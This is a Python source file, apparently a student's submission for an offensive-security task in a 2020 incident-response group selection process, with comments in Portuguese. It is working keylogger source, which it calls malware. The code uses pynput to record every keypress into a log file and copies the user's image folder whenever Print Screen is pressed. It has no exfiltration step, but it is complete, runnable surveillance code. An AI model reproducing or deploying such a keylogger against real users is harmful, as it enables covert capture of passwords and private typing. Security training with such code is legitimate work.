'''
PROCESSO SELETIVO - Grupo de Resposta a Incidentes de Segurança

Nome: Fernanda Veiga Gomes da Fonseca
TAG - Segurança Ofensiva - Entrega: 07/03/2020
'''

'''
Este código é o principal do malware (keylogger).
Ele é responsável por armazenar os caracteres correspondentes às teclas pressionadas em uma arquivo log.txt.
Esses caracteres são arbitrários e foram relacionados às teclas em um dicionário.
'''

from pynput.keyboard import Listener
import os
import shutil

# Caminho do arquivo log.txt.
log = "/home/fernanda/Documentos/PS_GRIS_2020/Semana1/7_Segurança Ofensiva/TAG 1/log.txt"

def escrita_log (caract):
    '''
    Função que recebe a tecla pressionada via Listener e a escreve no arquivo de log.
    '''

    '''
    Dicionário que relaciona a cada tecla pressionada um único caracter.
    Uma vez que o malware considera um caso simples (escrita em um bloco de notas, por exemplo), algumas teclas não foram contempladas.
    '''
    traducao = {"'": "", "Key.alt": "Ⓐ", "Key.alt_l": "Ⓐ", "Key.alt_r": "Ⓐ", "Key.backspace": "Ⓑ", "Key.caps_lock": "Ⓛ",
                "Key.cmd": "☐", "Key.cmd_l": "☐", "Key.cmd_r": "☐", "Key.ctrl": "Ⓒ", "Key.ctrl_l": "Ⓒ", "Key.ctrl_r": "Ⓒ",
                "Key.delete": "Ⓓ", "Key.down": "↓", "Key.end": "Ⓔ", "Key.enter": "↙", "Key.esc": "☒", "Key.insert": "Ⓘ",
                "Key.left": "←", "Key.page_down": "↧", "Key.page_up": "↥", "Key.print_screen": "Ⓟ", "Key.right": "→",
                "Key.shift_l": "⇧", "Key.shift_r": "⇧", "Key.space": " ", "Key.tab": "Ⓣ", "Key.up": "↑"}
                # "Key.alt_gr": "", "Key.f1": "", "Key.home": "", "Key.media_": "", "Key.menu": "", "Key.num_lock": "",
                # "Key.pause": "", "Key.scroll_lock": "", "Key.shift": ""

    '''
    De maneira a facilitar futuras análises do arquivo de log, atribui-se um único caracter a cada tecla pressionada.
    Por exemplo, o caracter "Ⓛ" pode ser analisado para que outro caracter seja escrito em letra maiúscula em um arquivo de log modificado.
    Assim, a leitura do log torna-se mais fácil através da leitura de outro arquivo (log_modificado.txt).
    '''

    # Valor inicial do caracter a ser escrito em logFile.
    caract_final = str (caract)

    # Definição do valor final de keydata com base no dicionário traducao.
    for caract in traducao:
    	caract_final = caract_final.replace (caract, traducao [caract])

    '''
    O arquivo de log é aberto para escrita a cada nova tecla pressionada.
    Observação: a abertura acontece com o método "a" ("append"), porque pode já haver caracteres existentes no arquivo.
    '''
    with open (log, "a") as f:
        f.write (caract_final)

        '''
        Caso seja pressionada a tecla de captura de tela, é feita a cópia dos arquivos de captura de tela,
        cujo caminho encontra-se na variável arquivos.
        '''
        if (caract_final == "Ⓟ"):
            arquivos = os.listdir ("/home/fernanda/Imagens")
            
            for nome_arquivo in arquivos:
                # Caminho de origem.
                src = os.path.join ("/home/fernanda/Imagens", nome_arquivo)
                
                # Caminho de destino.
                dst = "/home/fernanda/Documentos/PS_GRIS_2020/Semana1/7_Segurança Ofensiva/TAG 1"
    
                if os.path.isfile (src):
                    shutil.copy (src, dst)

# Abrir o Listener para escutar o evento on_press. Quando ocorrer, a função escrita_log é chamada.
with Listener (on_press = escrita_log) as l:
    l.join ()